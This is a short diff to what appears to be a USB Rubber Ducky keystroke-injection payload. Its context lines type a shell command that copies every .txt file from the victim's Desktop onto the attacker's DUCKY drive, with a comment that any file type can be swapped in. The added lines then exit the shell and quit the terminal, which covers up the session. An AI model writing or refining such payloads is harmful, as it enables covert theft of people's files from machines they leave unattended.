@@ -12,3 +12,8 @@ DELAY 500
 REM Replace txt with any file extension (ex. .pdf, .py, .doc, .html, .xlsx, .csv, .png, .jpeg, etc) 
 STRING find ~/Desktop -name "*.txt" -exec cp {} /Volumes/DUCKY \;
 ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 500
+COMMAND q
